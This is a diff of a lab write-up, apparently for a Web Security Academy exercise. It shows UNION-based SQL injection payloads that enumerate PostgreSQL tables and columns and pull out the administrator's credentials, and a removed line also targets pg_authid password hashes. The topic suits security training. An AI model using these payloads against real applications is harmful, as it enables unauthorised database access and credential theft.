@@ -22,7 +22,7 @@ Both columns can hold string data.
 
 Select the `TABLE_NAME` column from `information_schema.tables`
 
-![[Pasted image 20220521222233.png]]
+![[all tables.png]]
 
 The payload
 
@@ -43,9 +43,47 @@ SELECT COLUMN_NAME FROM information_schema.columns WHERE table_name = '$TABLE NA
 ' UNION SELECT COLUMN_NAME,NULL FROM information_schema.columns WHERE table_name = '$TABLE NAME$'--
 ```
 
+## Enumerating all tables
 
-' UNION SELECT 'rolname' 'rolpassword', NULL FROM pg_authid--
+I wrote a Python script to scrape the name of every table injecting the query to the `information_schema.tables` table on the page. Then I used those tables names to inject another query to look for interesting column names like `username` or `password`. Finally the script outputs the tables that contained columns with those keywords.
 
-'+UNION+SELECT+username_dyquix,NULL+FROM+users_reacks--
+![[script.png]]
 
-the table users_reacks has the info
+	Note: Another option would be to extract the tables names only and use Burp's Intruder to do the job and apply a filter for the same keywords.
+
+The script is available [here](https://github.com/JoseDRamirezM/InfoSec/blob/main/Web%20Security%20Academy/SQL%20injection/Attacks/Enumerating%20the%20database/labs/SQL%20injection%20attack%2C%20listing%20the%20database%20contents%20on%20non-Oracle%20databases/exploit.py)
+
+![[interesting tables.png]]
+
+Now look inspect the columns of the output tables for the `administrator` credentials. From here I'll go manual.
+
+Using the following payload obtain the columns of the tables.
+
+#SQLiPAYLOAD 
+```SQL
+' UNION SELECT COLUMN_NAME,NULL FROM information_schema.columns WHERE table_name = 'users_ebehna'--
+```
+	Note that the name of the user's table and columns changes on each instance.
+
+![[login table.png]]
+
+Then extract the information from the database.
+
+## Database type and version
+
+![[db type.png]]
+
+The database is `PostgreSQL 12.10` I did this mostly to extract both columns in one go.
+
+Using the following payload, the `administrator` credentials are obtained.
+
+#SQLiPAYLOAD 
+```SQL
+' UNION SELECT username_rbclpr||'~'||password_yxrmhn,NULL FROM users_ebehna--
+```
+
+![[Attacks/Enumerating the database/labs/SQL injection attack, listing the database contents on non-Oracle databases/images/admin creds.png]]
+
+`administrator~azqo1iz26c2ivxoy99kl`
+
+Now login as administrator and the lab is solved!
